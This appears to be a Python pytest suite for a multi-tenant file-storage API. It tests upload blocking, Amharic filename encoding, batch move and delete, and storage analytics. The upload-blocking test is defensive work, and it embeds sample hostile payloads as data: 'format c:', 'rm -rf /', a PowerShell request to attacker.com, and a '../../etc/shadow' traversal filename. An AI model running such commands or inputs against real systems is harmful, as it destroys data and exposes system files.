"""
Test Suite for Module 4 Enterprise Hardening:
1. Malware & Dangerous File Extension Defense (INSA/OWASP)
2. RFC 5987 Amharic/UTF-8 Filename Encoding & ETag Integrity Headers
3. Multi-Item Batch Move Operations
4. Multi-Item Batch Soft-Delete and Permanent Purge
5. Organization Storage Analytics & Drive Quota Utilization Breakdown
"""

import io
import uuid
import hashlib
import urllib.parse
from datetime import datetime, timezone
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.core.database import SessionLocal
from app.models.file import FileItem, DriveType
from app.services.storage_service import storage_provider

client = TestClient(app)


@pytest.fixture
def db_session():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def provision_tenant_admin(slug_prefix: str = "hardened-storage"):
    """Helper to provision tenant and return authenticated headers."""
    slug = f"{slug_prefix}-{uuid.uuid4().hex[:6]}"
    admin_email = f"admin@{slug}.et"
    password = "AdminPassword2026!"

    prov_payload = {
        "organization_name": f"Hardened Storage Corp {slug}",
        "slug": slug,
        "tin_number": "1234567890",
        "admin_email": admin_email,
        "admin_password": password,
        "admin_full_name": "Hardened Storage Admin",
        "max_users": 10,
        "storage_limit_gb": 5.0,
    }
    r = client.post("/api/v1/organizations/provision", json=prov_payload)
    assert r.status_code == 201

    login_admin = client.post("/api/v1/auth/login", json={"email": admin_email, "password": password})
    assert login_admin.status_code == 200
    token = login_admin.json()["access_token"]
    return {
        "slug": slug,
        "headers": {"Authorization": f"Bearer {token}"},
        "email": admin_email,
    }


# =====================================================================
# Test 1: Malware & Dangerous File Extension Defense (INSA/OWASP)
# =====================================================================

def test_malware_and_dangerous_extensions_blocked(db_session):
    """
    Verifies that executable and script files (.exe, .bat, .ps1, .sh, .vbs)
    and path traversal sequences are blocked with 400 Bad Request.
    """
    tenant = provision_tenant_admin("malware-block")
    headers = tenant["headers"]

    dangerous_files = [
        ("trojan.exe", b"MZ\x90\x00\x03\x00\x00\x00"),
        ("ransomware.bat", b"@echo off\r\nformat c:"),
        ("backdoor.ps1", b"Invoke-WebRequest -Uri http://attacker.com"),
        ("exploit.sh", b"#!/bin/bash\nrm -rf /"),
        ("macro_payload.vbs", b"Set objShell = CreateObject(\"Wscript.Shell\")"),
        ("installer.msi", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"),
    ]

    for fname, payload in dangerous_files:
        files = {"file": (fname, io.BytesIO(payload), "application/octet-stream")}
        r = client.post("/api/v1/files/upload", files=files, data={"drive_type": "PERSONAL"}, headers=headers)
        assert r.status_code == 400
        data = r.json()
        assert data["detail"]["code"] == "SECURITY_VIOLATION"
        assert "የተከለከለ" in data["detail"]["message"]

    # Test Path Traversal rejection
    traversal_files = {"file": ("../../etc/shadow.txt", io.BytesIO(b"root::0:0:"), "text/plain")}
    r_trav = client.post("/api/v1/files/upload", files=traversal_files, data={"drive_type": "PERSONAL"}, headers=headers)
    assert r_trav.status_code == 400
    assert r_trav.json()["detail"]["code"] == "SECURITY_VIOLATION"

    # Legitimate corporate documents SUCCEED
    legit_files = {"file": ("quarterly_earnings.pdf", io.BytesIO(b"%PDF-1.4 Legit financial report"), "application/pdf")}
    r_ok = client.post("/api/v1/files/upload", files=legit_files, data={"drive_type": "PERSONAL"}, headers=headers)
    assert r_ok.status_code == 201
    assert r_ok.json()["name"] == "quarterly_earnings.pdf"


# =====================================================================
# Test 2: RFC 5987 Amharic Filename Encoding & ETag Integrity
# =====================================================================

def test_rfc5987_amharic_filename_and_etag_download(db_session):
    """
    Verifies that Ethiopian non-Latin document names (Amharic) are cleanly encoded
    via RFC 5987 in Content-Disposition headers, and ETag header returns SHA-256.
    """
    tenant = provision_tenant_admin("amharic-rfc")
    headers = tenant["headers"]

    amharic_name = "የ2019 የፋይናንስ ኦዲት ሪፖርት.pdf"
    content = b"%PDF-1.4 Sample Amharic Financial Report Bytes"
    expected_sha256 = hashlib.sha256(content).hexdigest()

    # Upload document with Amharic title
    files = {"file": (amharic_name, io.BytesIO(content), "application/pdf")}
    r_up = client.post("/api/v1/files/upload", files=files, data={"drive_type": "COMPANY"}, headers=headers)
    assert r_up.status_code == 201
    file_id = r_up.json()["id"]
    assert r_up.json()["name"] == amharic_name

    # Download document
    r_dl = client.get(f"/api/v1/files/{file_id}/download", headers=headers)
    assert r_dl.status_code == 200
    assert r_dl.content == content

    # Verify ETag integrity header
    etag = r_dl.headers.get("etag")
    assert etag is not None
    assert expected_sha256 in etag

    # Verify RFC 5987 Content-Disposition header
    cd = r_dl.headers.get("content-disposition")
    assert cd is not None
    assert "filename*=" in cd
    assert "UTF-8''" in cd
    encoded_title = urllib.parse.quote(amharic_name, encoding="utf-8")
    assert encoded_title in cd
    assert r_dl.headers.get("accept-ranges") == "bytes"


# =====================================================================
# Test 3: Multi-Item Batch Move Operations
# =====================================================================

def test_batch_move_operations(db_session):
    """
    Verifies atomic bulk moving of multiple files into a destination folder.
    """
    tenant = provision_tenant_admin("batch-move")
    headers = tenant["headers"]

    # Create destination folder: "Archive 2019"
    r_dest = client.post("/api/v1/files/folder", json={"name": "Archive 2019", "drive_type": "COMPANY"}, headers=headers)
    assert r_dest.status_code == 201
    dest_id = r_dest.json()["id"]

    # Create 3 files in root
    file_ids = []
    for i in range(1, 4):
        f = {"file": (f"doc_{i}.txt", io.BytesIO(f"Content {i}".encode()), "text/plain")}
        r = client.post("/api/v1/files/upload", files=f, data={"drive_type": "COMPANY"}, headers=headers)
        assert r.status_code == 201
        file_ids.append(r.json()["id"])

    # Batch move all 3 files into "Archive 2019"
    batch_payload = {
        "item_ids": file_ids,
        "new_parent_id": dest_id
    }
    r_batch = client.patch("/api/v1/files/batch/move", json=batch_payload, headers=headers)
    assert r_batch.status_code == 200
    res = r_batch.json()
    assert res["moved_count"] == 3
    assert res["failed_count"] == 0

    # Verify all 3 files now list under "Archive 2019"
    r_list = client.get(f"/api/v1/files?drive_type=COMPANY&parent_id={dest_id}", headers=headers)
    assert r_list.status_code == 200
    archived_ids = [item["id"] for item in r_list.json()]
    for fid in file_ids:
        assert fid in archived_ids


# =====================================================================
# Test 4: Multi-Item Batch Soft-Delete and Permanent Purge
# =====================================================================

def test_batch_delete_and_purge(db_session):
    """
    Verifies bulk soft-delete to Recycle Bin and bulk permanent purge.
    """
    tenant = provision_tenant_admin("batch-del")
    headers = tenant["headers"]

    # Create 3 files
    file_ids = []
    for i in range(1, 4):
        f = {"file": (f"purge_test_{i}.txt", io.BytesIO(b"Data" * 1000), "text/plain")}
        r = client.post("/api/v1/files/upload", files=f, data={"drive_type": "PERSONAL"}, headers=headers)
        assert r.status_code == 201
        file_ids.append(r.json()["id"])

    # 1. Batch Soft Delete
    r_soft = client.request(
        "DELETE",
        "/api/v1/files/batch/delete",
        json={"item_ids": file_ids, "permanent": False},
        headers=headers,
    )
    assert r_soft.status_code == 200
    assert r_soft.json()["affected_count"] == 3

    # Verify items are in TRASH
    r_trash = client.get("/api/v1/files?drive_type=TRASH", headers=headers)
    assert r_trash.status_code == 200
    trash_ids = [item["id"] for item in r_trash.json()]
    for fid in file_ids:
        assert fid in trash_ids

    # 2. Batch Permanent Purge
    r_purge = client.request(
        "DELETE",
        "/api/v1/files/batch/delete",
        json={"item_ids": file_ids, "permanent": True},
        headers=headers,
    )
    assert r_purge.status_code == 200
    assert r_purge.json()["affected_count"] == 3
    assert r_purge.json()["freed_bytes"] == 3 * 4000

    # Verify items are gone from DB
    remaining = db_session.query(FileItem).filter(FileItem.id.in_([uuid.UUID(fid) for fid in file_ids])).all()
    assert len(remaining) == 0


# =====================================================================
# Test 5: Organization Storage Analytics Breakdown
# =====================================================================

def test_storage_analytics_summary(db_session):
    """
    Verifies tenant storage utilization analytics including personal vs company
    bytes, active counts, and top largest file breakdown.
    """
    tenant = provision_tenant_admin("analytics")
    headers = tenant["headers"]

    # 1. Upload 10KB to Personal Drive
    p_data = b"P" * 10240
    client.post("/api/v1/files/upload", files={"file": ("personal_doc.pdf", io.BytesIO(p_data), "application/pdf")}, data={"drive_type": "PERSONAL"}, headers=headers)

    # 2. Upload 25KB to Company Drive
    c_data = b"C" * 25600
    client.post("/api/v1/files/upload", files={"file": ("company_audit.pdf", io.BytesIO(c_data), "application/pdf")}, data={"drive_type": "COMPANY"}, headers=headers)

    # 3. Create a Folder
    client.post("/api/v1/files/folder", json={"name": "Analytics Folder", "drive_type": "COMPANY"}, headers=headers)

    # 4. Fetch Storage Analytics
    r_ana = client.get("/api/v1/files/analytics/summary", headers=headers)
    assert r_ana.status_code == 200
    ana = r_ana.json()

    assert ana["total_used_bytes"] == 10240 + 25600
    assert ana["personal_drive_bytes"] == 10240
    assert ana["company_drive_bytes"] == 25600
    assert ana["total_files"] >= 2
    assert ana["total_folders"] >= 1
    assert len(ana["top_largest_files"]) >= 2

    # Verify largest file order
    largest = ana["top_largest_files"][0]
    assert largest["name"] == "company_audit.pdf"
    assert largest["size_bytes"] == 25600
    assert largest["ec_created_at"] is not None
    assert "ዓ.ም" in largest["ec_created_at"]
